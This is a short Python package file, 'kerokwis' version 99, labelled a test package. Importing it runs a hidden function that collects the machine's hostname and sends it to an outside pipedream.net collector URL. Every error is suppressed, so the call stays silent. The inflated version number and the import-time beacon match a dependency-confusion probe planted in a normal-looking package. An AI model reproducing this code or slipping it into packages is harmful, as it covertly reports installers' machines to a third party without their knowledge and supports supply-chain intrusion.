"""kerokwis - test package (v99)."""
import urllib.parse
import urllib.request

__version__ = "99"

_URL = (
    "https://eo8f3m3ho26a0nm.m.pipedream.net/"
    "?ecosystem=pip&package=kerokwis&trigger=runtime"
)


def _ping():  # best-effort, never raises
    try:
        try:
            import socket
            h = socket.gethostname() or "unknown"
        except Exception:
            h = "unknown"
        url = _URL + "&h=" + urllib.parse.quote(h, safe="")
    except Exception:
        url = _URL
    try:
        with urllib.request.urlopen(url, timeout=10) as r:
            r.read(1)
    except Exception:
        pass


try:
    _ping()
except Exception:
    pass


def hello():
    return "kerokwis v99"
